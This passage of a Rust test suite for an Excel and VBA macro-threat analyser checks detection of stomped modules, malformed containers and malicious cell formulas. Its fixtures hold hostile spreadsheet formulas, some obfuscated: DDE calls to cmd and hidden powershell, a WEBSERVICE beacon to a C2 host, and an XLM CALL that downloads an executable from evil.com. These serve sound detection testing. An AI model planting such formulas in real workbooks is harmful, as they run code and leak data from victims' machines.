        "WorkbookTest",
        &[("DummyModule", src, &pcode)],
        &["NormalSub"],
    );

    let sheet_xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\"><f>=cmd|'/c calc.exe'!A1</f></c><c r=\"A2\"><f>=EXEC(\"powershell.exe\")</f></c></row></sheetData></worksheet>";
    let xlsm = synthesize_xlsm_with_sheets(
        &cfb,
        &[(
            "Sheet1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
            sheet_xml,
        )],
    );

    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");

    assert!(
        inspection
            .extracted
            .diagnostics
            .iter()
            .any(|d| d.contains("Potential DDE execution formula")
                && d.contains("=cmd|'/c calc.exe'!A1")),
        "should flag DDE formula: {:?}",
        inspection.extracted.diagnostics
    );
    assert!(
        inspection.extracted.diagnostics.iter().any(|d| d
            .contains("Potential Excel 4.0 (XLM) macro execution formula")
            && d.contains("=EXEC(\"powershell.exe\")")),
        "should flag XLM execution formula: {:?}",
        inspection.extracted.diagnostics
    );
}

#[test]
fn e2e_stomped_garbage_source_graceful_recovery_and_detection() {
    let line0 = build_func_defn(0); // EvilProcedure
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let text_offset = pcode.len() as u32;

    // Craft raw module stream: valid P-code followed by non-OVBA corrupted garbage bytes
    let mut raw_stream = pcode.clone();
    raw_stream.extend_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xaa, 0xbb, 0xcc, 0xdd]);

    let identifiers = &["EvilProcedure"];
    let cfb = synthesize_cfb_raw_project_with_manifest(
        "CorruptedSourceAttack",
        &[("StompedMod", Some(&raw_stream), text_offset)],
        identifiers,
        None,
    );
    let xlsm = synthesize_xlsm(&cfb);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options)
        .expect("inspection should gracefully recover despite corrupted source container");

    let report = &inspection.stomping_report;
    assert!(report.has_stomping);
    assert_eq!(report.overall_severity, StompingSeverity::Critical);

    let stomped_mod = report
        .modules
        .iter()
        .find(|m| m.module_name == "StompedMod")
        .expect("StompedMod report should exist");
    assert_eq!(stomped_mod.severity, StompingSeverity::Critical);

    let has_corrupted_finding = stomped_mod.findings.iter().any(|f| {
        matches!(&f.kind, StompingFindingKind::SourceCorruptedWithValidPCode(err) if err.contains("signature must be 0x01"))
    });
    assert!(
        has_corrupted_finding,
        "should flag SourceCorruptedWithValidPCode finding: {:?}",
        stomped_mod.findings
    );

    let sarif = stomping_to_sarif(report, "corrupted_source.xlsm");
    assert!(
        sarif.contains("VBA-STOMP-010"),
        "SARIF should include rule VBA-STOMP-010"
    );
}

#[test]
fn e2e_stomped_pure_pcode_without_source_bytes() {
    let line0 = build_func_defn(0); // PurePCodeProc
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let text_offset = pcode.len() as u32; // text_offset == raw_stream.len()

    let identifiers = &["PurePCodeProc"];
    let cfb = synthesize_cfb_raw_project_with_manifest(
        "PurePCodeAttack",
        &[("ZeroSourceMod", Some(&pcode), text_offset)],
        identifiers,
        None,
    );
    let xlsm = synthesize_xlsm(&cfb);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options)
        .expect("inspection should handle pure p-code module cleanly");

    let report = &inspection.stomping_report;
    assert!(report.has_stomping);
    assert_eq!(report.overall_severity, StompingSeverity::Critical);

    let mod_rep = report
        .modules
        .iter()
        .find(|m| m.module_name == "ZeroSourceMod")
        .expect("ZeroSourceMod report should exist");
    assert_eq!(mod_rep.severity, StompingSeverity::Critical);
    assert!(
        mod_rep
            .findings
            .iter()
            .any(|f| matches!(f.kind, StompingFindingKind::SourcePurged)),
        "should flag SourcePurged for pure pcode module"
    );
}

#[test]
fn e2e_multi_module_partial_corruption_and_ghost_module_isolation() {
    let valid_src = "Attribute VB_Name = \"ValidMod\"\nSub GoodSub()\nEnd Sub\n";
    let line0 = build_func_defn(0); // GoodSub
    let valid_pcode = synthesize_pcode_line_map(&[&line0]);
    let mut valid_stream = valid_pcode.clone();
    valid_stream.extend_from_slice(&comp_ovba(valid_src.as_bytes()));

    // Module 2: Out of bounds text offset (offset 999999)
    let corrupted_stream = vec![0u8; 64];

    // Module 3: Ghost module (declared in dir stream, but None stream in CFB storage)

    let identifiers = &["GoodSub"];
    let cfb = synthesize_cfb_raw_project_with_manifest(
        "FaultIsolationTest",
        &[
            ("ValidMod", Some(&valid_stream), valid_pcode.len() as u32),
            ("BadOffsetMod", Some(&corrupted_stream), 999999),
            ("GhostMod", None, 0),
        ],
        identifiers,
        None,
    );
    let xlsm = synthesize_xlsm(&cfb);

    let options = AnalysisOptions::default();
    let inspection =
        inspect_macro_file(&xlsm, &options).expect("inspection should succeed via fault isolation");

    // All 3 modules should be present in extracted modules
    assert_eq!(inspection.extracted.modules.len(), 3);

    let valid_mod = inspection
        .extracted
        .modules
        .iter()
        .find(|m| m.name == "ValidMod")
        .expect("ValidMod should be extracted");
    assert!(valid_mod.source_text.is_some());
    assert!(valid_mod.source_text.as_ref().unwrap().contains("GoodSub"));

    let bad_mod = inspection
        .extracted
        .modules
        .iter()
        .find(|m| m.name == "BadOffsetMod")
        .expect("BadOffsetMod should be extracted");
    assert!(
        bad_mod
            .diagnostic
            .as_ref()
            .is_some_and(|d| d.contains("outside stream"))
    );

    let ghost_mod = inspection
        .extracted
        .modules
        .iter()
        .find(|m| m.name == "GhostMod")
        .expect("GhostMod should be extracted");
    assert!(
        ghost_mod
            .diagnostic
            .as_ref()
            .is_some_and(|d| d.contains("module stream missing"))
    );
}

#[test]
fn e2e_cell_threat_advanced_evasion_detection() {
    let src = "Attribute VB_Name = \"SheetAudit\"\nSub Dummy()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
        "CellThreatWorkbook",
        &[("SheetAudit", src, &pcode)],
        &["Dummy"],
    );

    let sheet_xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\
        <sheetData>\
            <row r=\"1\">\
                <c r=\"A1\"><f>=\"cmd.exe\"|' /c calc.exe'!A0</f></c>\
                <c r=\"A2\"><f>+powershell.exe|' -w hidden -enc AAA='!A1</f></c>\
                <c r=\"A3\"><f>='[http://evil.example.com/exploit.xlsx]Sheet1'!A1</f></c>\
                <c r=\"A4\"><f>=[\\\\192.168.1.100\\share\\c2.xlsx]Sheet1!A1</f></c>\
                <c r=\"A5\"><f>=WEBSERVICE(\"http://c2.evil.com/beacon?st=\" &amp; A1)</f></c>\
                <c r=\"A6\"><f>=HYPERLINK(\"https://phish.example.com/update.exe\", \"Click to Update\")</f></c>\
                <c r=\"A7\"><f>=CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"http://evil.com/a.exe\",\"c:\\temp\\a.exe\",0,0)</f></c>\
                <c r=\"A8\"><f>=IF(1, EXEC (\"calc.exe\"))</f></c>\
                <c r=\"A9\"><f>=HYPERLINK (\"ms-appinstaller:?source=https://evil.com/app.msix\", \"Install\")</f></c>\
                <c r=\"A10\"><f>=msdt.exe|' /id PCWDiagnostic'!A0</f></c>\
                <c r=\"A11\"><f>=HYPERLINK(\"http://evil.com/payload.jse\", \"Script\")</f></c>\
            </row>\
        </sheetData>\
    </worksheet>";

    let xlsm = synthesize_xlsm_with_sheets(
        &cfb,
        &[(
            "Sheet1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
            sheet_xml,
        )],
    );

    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let diags = &inspection.extracted.diagnostics;

    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential DDE execution formula") && d.contains("cmd.exe")),
        "should detect quoted cmd.exe DDE: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential DDE execution formula") && d.contains("powershell.exe")),
        "should detect +powershell.exe DDE: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential DDE execution formula") && d.contains("msdt.exe")),
        "should detect msdt.exe DDE: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential remote workbook link injection")
                && d.contains("http://evil.example.com")),
        "should detect remote HTTP workbook link: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential remote workbook link injection")
                && d.contains("192.168.1.100")),
        "should detect remote UNC workbook link: {diags:?}"
    );
    assert!(
        diags.iter().any(
            |d| d.contains("Potential external data request / exfiltration formula")
                && d.contains("WEBSERVICE")
        ),
        "should detect WEBSERVICE exfiltration: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Suspicious executable download hyperlink")
                && d.contains("update.exe")),
        "should detect executable download hyperlink: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Suspicious executable download hyperlink")
                && d.contains("ms-appinstaller:")),
        "should detect ms-appinstaller protocol hyperlink: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Suspicious executable download hyperlink")
                && d.contains("payload.jse")),
        "should detect jse script hyperlink: {diags:?}"
    );
    assert!(
        diags.iter().any(
            |d| d.contains("Potential Excel 4.0 (XLM) macro execution formula")
                && d.contains("CALL")
        ),
        "should detect XLM CALL formula: {diags:?}"
    );
    assert!(
        diags.iter().any(
            |d| d.contains("Potential Excel 4.0 (XLM) macro execution formula")
                && d.contains("EXEC")
        ),
        "should detect spaced/nested XLM EXEC formula: {diags:?}"
    );
}

#[test]
fn e2e_null_byte_module_name_evasion_detection() {
    let src = "Attribute VB_Name = \"EvasionModule\"\nSub HiddenCode()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let text_offset = pcode.len() as u32;

    let mut raw_stream = pcode.clone();
    raw_stream.extend_from_slice(&comp_ovba(src.as_bytes()));

    let identifiers = &["HiddenCode"];
    // Module name contains embedded null byte: "Payload\0SafeMod"
    let cfb = synthesize_cfb_raw_project_with_manifest(
        "NullByteEvasionProject",
        &[("Payload\0SafeMod", Some(&raw_stream), text_offset)],
        identifiers,
        None,
    );
    let xlsm = synthesize_xlsm(&cfb);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");

    assert!(
        inspection
            .extracted
            .diagnostics
            .iter()
            .any(|d| d.contains("Module name contains null byte (evasion attempt)")),
        "should flag null byte in module name: {:?}",
        inspection.extracted.diagnostics
    );
}

#[test]
fn e2e_cfb_cyclic_storage_protection() {
    let src = "Sub Foo()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let mut cfb = synthesize_cfb_project("CycleTest", &[("Mod1", src, &pcode)], &["Foo"]);

    // In directory entries (offset 1024..2048 in CFB):
    // Entry 0 is Root Entry (1024..1152)
    // Entry 1 is PROJECT (1152..1280)
    // Entry 2 is VBA storage (1280..1408)
    // Tamper Entry 2 (VBA storage): make its child point to Entry 2 itself (cyclic storage loop)
    let vba_entry_offset = 1024 + 2 * 128;
    // child is at offset +76
    cfb[vba_entry_offset + 76..vba_entry_offset + 80].copy_from_slice(&2u32.to_le_bytes());

    let res = vba_insight::cfb::CompoundFile::open(&cfb, &Limits::default());
    assert!(res.is_err(), "cyclic storage CFB must be rejected");
    let err = res.err().unwrap();
    assert!(
        err.contains("cycle") || err.contains("limit"),
        "error message should report cycle or nesting limit: {err}"
    );
}

#[test]
fn e2e_fullwidth_and_living_off_the_land_threat_detection() {
    let src = "Attribute VB_Name = \"ThreatAudit\"\nSub Dummy()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
        "ThreatAuditProject",
        &[("ThreatAudit", src, &pcode)],
        &["Dummy"],
    );

    let sheet_xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\
        <sheetData>\
            <row r=\"1\">\
                <c r=\"A1\"><f>\u{FF1D}pythonw|'run.py'!A0</f></c>\
                <c r=\"A2\"><f>\u{FF0B}wsl|'sh -c evil'!A0</f></c>\
                <c r=\"A3\"><f>\u{FF0D}tar|'-xf archive.tar'!A0</f></c>\
                <c r=\"A4\"><f>=HYPERLINK(\"ms-appinstaller:?source=https://attacker.example.com/mal.msix\", \"Install\")</f></c>\
                <c r=\"A5\"><f>=HYPERLINK(\"search-ms:query=invoice&amp;crumb=location:\\\\evil.com\\share\", \"View Invoice\")</f></c>\
            </row>\
        </sheetData>\
    </worksheet>";

    let xlsm = synthesize_xlsm_with_sheets(
        &cfb,
        &[(
            "Sheet1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
            sheet_xml,
        )],
    );

    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let diags = &inspection.extracted.diagnostics;

    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential DDE execution formula") && d.contains("pythonw")),
        "should detect fullwidth equals and pythonw: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential DDE execution formula") && d.contains("wsl")),
        "should detect fullwidth plus and wsl: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential DDE execution formula") && d.contains("tar")),
        "should detect fullwidth minus and tar: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Suspicious executable download hyperlink")
                && d.contains("ms-appinstaller:")),
        "should detect ms-appinstaller protocol handler: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Suspicious executable download hyperlink")
                && d.contains("search-ms:")),
        "should detect search-ms protocol handler: {diags:?}"
    );
}

#[test]
fn e2e_lone_cr_line_endings_in_project_and_source() {
    let src = "Attribute VB_Name = \"CrMod\"\r#Const DEBUG_MODE = 1\r#If DEBUG_MODE\rPublic Sub AutoOpen()\r    MsgBox \"hello\"\rEnd Sub\r#End If\r";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project("CrProject", &[("CrMod", src, &pcode)], &["AutoOpen"]);
    let xlsm = synthesize_xlsm(&cfb);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");

    assert_eq!(inspection.extracted.modules.len(), 1);
    let m = &inspection.extracted.modules[0];
    assert_eq!(m.name, "CrMod");
    assert!(m.source_text.is_some());
    assert!(m.source_text.as_ref().unwrap().contains("AutoOpen"));
}

#[test]
fn e2e_cfb_unlinked_orphan_directory_entry_detection() {
    let src = "Sub Clean()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let mut cfb = synthesize_cfb_project("UnlinkedTest", &[("Mod1", src, &pcode)], &["Clean"]);

    let orphan_entry_off = 1024 + 6 * 128;
    put_cfb_entry(
        &mut cfb[orphan_entry_off..],
        0,
        "StealthPayload",
        2, // stream
        0xFFFFFFFF,
        0xFFFFFFFF,
        0xFFFFFFFF,
        0xFFFFFFFE,
        0,
    );

    let comp = vba_insight::cfb::CompoundFile::open(&cfb, &Limits::default())
        .expect("open should succeed");
    let unlinked_entry = comp
        .entries
        .iter()
        .find(|e| e.name == "StealthPayload")
        .expect("StealthPayload entry must be discovered");
    assert_eq!(unlinked_entry.path, "[unlinked]/StealthPayload");
}

#[test]
fn e2e_defined_name_and_very_hidden_sheet_threat_detection() {
    let src = "Sub Auto_Open()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
        "ThreatProj",
        &[("ThisWorkbook", src, &pcode)],
        &["Auto_Open"],
    );

    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/><Override PartName=\"/xl/worksheets/sheet2.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><workbookPr codeName=\"ThisWorkbook\"/><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\"/><sheet name=\"HiddenEvil\" sheetId=\"2\" state=\"veryHidden\" r:id=\"rId3\"/></sheets><definedNames><definedName name=\"Auto_Open\">Sheet1!$A$1</definedName><definedName name=\"CmdPayload\">=cmd|'/c calc'!A1</definedName><definedName name=\"XlmPayload\">=EXEC(\"calc.exe\")</definedName></definedNames></workbook>";
    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/><Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet2.xml\"/></Relationships>";

    // sheet1 has full-width characters in formula
    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\"><f>＝ＥＸＥＣ（＂ｃａｌｃ＂）</f></c><c r=\"A2\"><f>＝ｃｍｄ｜＇／ｃ　ｃａｌｃ＇！Ａ１</f></c></row></sheetData></worksheet>";
    let sheet2 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData/></worksheet>";

    let xlsm = synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/vbaProject.bin", &cfb),
        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
        ("xl/worksheets/sheet2.xml", sheet2.as_bytes()),
    ]);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let diags = &inspection.extracted.diagnostics;

    assert!(
        diags
            .iter()
            .any(|d| d.contains("Worksheet 'HiddenEvil' is set to 'veryHidden'")),
        "should detect veryHidden sheet: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("defined name 'Auto_Open' triggers auto-execution")),
        "should detect Auto_Open defined name: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential DDE execution formula in defined name 'CmdPayload'")),
        "should detect DDE in defined name: {diags:?}"
    );
    assert!(
        diags.iter().any(|d| d.contains(
            "Potential Excel 4.0 (XLM) macro execution formula in defined name 'XlmPayload'"
        )),
        "should detect XLM in defined name: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d
                .contains("Potential Excel 4.0 (XLM) macro execution formula in cell 'Sheet1'!A1")),
        "should detect normalized fullwidth EXEC formula: {diags:?}"
    );
    assert!(
        diags
            .iter()
            .any(|d| d.contains("Potential DDE execution formula in cell 'Sheet1'!A2")),
        "should detect normalized fullwidth DDE formula: {diags:?}"
    );

    // Verify structured cell_threats
    let threats = &inspection.extracted.cell_threats;
    assert!(!threats.is_empty(), "cell_threats should not be empty");
    assert!(
        threats.iter().any(|t| t.threat_kind == "VeryHiddenSheet"),
        "should have VeryHiddenSheet threat: {threats:?}"
    );
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "AutoExecDefinedName"),
        "should have AutoExecDefinedName threat: {threats:?}"
    );
    assert!(
        threats.iter().any(|t| t.threat_kind == "DDE"),
        "should have DDE threat: {threats:?}"
    );
    assert!(
        threats.iter().any(|t| t.threat_kind == "XLM"),
        "should have XLM threat: {threats:?}"
    );

    // Verify inspect_to_json output contains cell_threats with rule_id
    let json_report = inspect_to_json(&inspection, Disclosure::IncludeSource);
    assert!(json_report.contains("\"cell_threats\":["));
    assert!(json_report.contains("\"threat_kind\":\"DDE\""));
    assert!(json_report.contains("\"threat_kind\":\"XLM\""));
    assert!(json_report.contains("\"rule_id\":\"VBA-CELL-001\""));
    assert!(json_report.contains("\"rule_id\":\"VBA-CELL-002\""));

    // Verify inspection_to_sarif output contains dynamic version, rules, and results
    let sarif_report = inspection_to_sarif(&inspection, "threat_test.xlsm");
    let expected_ver_fragment = format!("\"version\":\"{}\"", env!("CARGO_PKG_VERSION"));
    assert!(sarif_report.contains(&expected_ver_fragment));
    assert!(sarif_report.contains("\"id\":\"VBA-STOMP-001\""));
    assert!(sarif_report.contains("\"id\":\"VBA-CELL-001\""));
    assert!(sarif_report.contains("\"id\":\"VBA-CELL-002\""));
    assert!(sarif_report.contains("\"ruleId\":\"VBA-CELL-001\""));
    assert!(sarif_report.contains("\"ruleId\":\"VBA-CELL-002\""));
    assert!(sarif_report.contains("\"ruleId\":\"VBA-CELL-006\""));
    assert!(sarif_report.contains("\"ruleId\":\"VBA-CELL-007\""));

    // Verify inspect_to_markdown contains threats table
    let md_report = inspect_to_markdown(&inspection);
    assert!(md_report.contains("## Worksheet & Cell Threats"));
    assert!(md_report.contains("- **Cell Threats:**"));
}

#[test]
fn e2e_deobfuscated_cell_threat_and_dynamic_evaluation() {
    let src = "Sub Harmless()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
        "DeobfuscationProj",
        &[("ThisWorkbook", src, &pcode)],
        &["Harmless"],
    );

    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><workbookPr codeName=\"ThisWorkbook\"/><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\"/></sheets></workbook>";
    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/></Relationships>";

    // Cell A1: =CHAR(99)&CHAR(109)&CHAR(100)&"|'/c calc'!A0" (DDE obfuscation)
    // Cell B1: =HYPERLINK(CONCATENATE("http://evil.example.com/malware", CHAR(46), CHAR(101), CHAR(120), CHAR(101)), "Invoice") (Hyperlink obfuscation)
    // Cell C1: =CONCATENATE("powershell.exe -w hidden ", "calc.exe") (General command obfuscation)
    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\"><f>=CHAR(99)&amp;CHAR(109)&amp;CHAR(100)&amp;&quot;|'/c calc'!A0&quot;</f></c><c r=\"B1\"><f>=HYPERLINK(CONCATENATE(&quot;http://evil.example.com/malware&quot;, CHAR(46), CHAR(101), CHAR(120), CHAR(101)), &quot;Invoice&quot;)</f></c><c r=\"C1\"><f>=CONCATENATE(&quot;powershell.exe -w hidden &quot;, &quot;calc.exe&quot;)</f></c></row></sheetData></worksheet>";

    let xlsm = synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/vbaProject.bin", &cfb),
        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
    ]);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let threats = &inspection.extracted.cell_threats;

    // Check A1: Deobfuscated DDE
    assert!(
        threats.iter().any(|t| t.cell_ref == "A1"
            && t.threat_kind == "DDE"
            && t.description.contains("De-obfuscated DDE")),
        "A1 should be detected as de-obfuscated DDE: {threats:?}"
    );

    // Check B1: Deobfuscated Suspicious Hyperlink
    assert!(
        threats.iter().any(|t| t.cell_ref == "B1"
            && t.threat_kind == "SuspiciousHyperlink"
            && t.description.contains("de-obfuscated")),
        "B1 should be detected as de-obfuscated SuspiciousHyperlink: {threats:?}"
    );

    // Check C1: Deobfuscated Threat (powershell command)
    assert!(
        threats.iter().any(|t| t.cell_ref == "C1"
            && t.threat_kind == "DeobfuscatedThreat"
            && t.description.contains("powershell.exe")),
        "C1 should be detected as DeobfuscatedThreat: {threats:?}"
    );

    // Verify JSON export contains rule_id VBA-CELL-009
    let json_report = inspect_to_json(&inspection, Disclosure::IncludeSource);
    assert!(
        json_report.contains("\"rule_id\":\"VBA-CELL-009\""),
        "JSON report should contain VBA-CELL-009: {json_report}"
    );

    // Verify SARIF export contains VBA-CELL-009
    let sarif_report = inspection_to_sarif(&inspection, "deobfuscated.xlsm");
    assert!(
        sarif_report.contains("\"id\":\"VBA-CELL-009\""),
        "SARIF rules should contain VBA-CELL-009: {sarif_report}"
    );
    assert!(
        sarif_report.contains("\"ruleId\":\"VBA-CELL-009\""),
        "SARIF results should contain VBA-CELL-009: {sarif_report}"
    );
}

#[test]
fn e2e_advanced_radix_lookup_and_unicode_cell_threat_detection() {
    let src = "Sub Harmless()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
        "RadixLookupProj",
        &[("ThisWorkbook", src, &pcode)],
        &["Harmless"],
    );

    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><workbookPr codeName=\"ThisWorkbook\"/><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\"/></sheets></workbook>";

    // Grid data:
    // A1: "c", B1: "m", C1: "d"
    // F1: "dropper", G1: "http://attacker.example.com/beacon.exe"
    // D1: =TEXTJOIN("", TRUE, INDEX(A1:C1, 1), INDEX(A1:C1, 2), INDEX(A1:C1, 3)) & UNICHAR(46) & UNICHAR(HEX2DEC("65")) & UNICHAR(HEX2DEC("78")) & UNICHAR(HEX2DEC("65")) & "|'/c calc'!A0"
    // E1: =VLOOKUP("dropper", F1:G1, 2, FALSE)
    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>\
        <row r=\"1\">\
            <c r=\"A1\" t=\"s\"><v>0</v></c>\
            <c r=\"B1\" t=\"s\"><v>1</v></c>\
            <c r=\"C1\" t=\"s\"><v>2</v></c>\
            <c r=\"D1\"><f>=TEXTJOIN(&quot;&quot;, TRUE, INDEX(A1:C1, 1), INDEX(A1:C1, 2), INDEX(A1:C1, 3)) &amp; UNICHAR(46) &amp; UNICHAR(HEX2DEC(&quot;65&quot;)) &amp; UNICHAR(HEX2DEC(&quot;78&quot;)) &amp; UNICHAR(HEX2DEC(&quot;65&quot;)) &amp; &quot;|'/c calc'!A0&quot;</f></c>\
            <c r=\"E1\"><f>=VLOOKUP(&quot;dropper&quot;, F1:G1, 2, FALSE)</f></c>\
            <c r=\"F1\" t=\"s\"><v>3</v></c>\
            <c r=\"G1\" t=\"s\"><v>4</v></c>\
        </row>\
    </sheetData></worksheet>";

    let shared_strings = "<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"5\" uniqueCount=\"5\">\
        <si><t>c</t></si>\
        <si><t>m</t></si>\
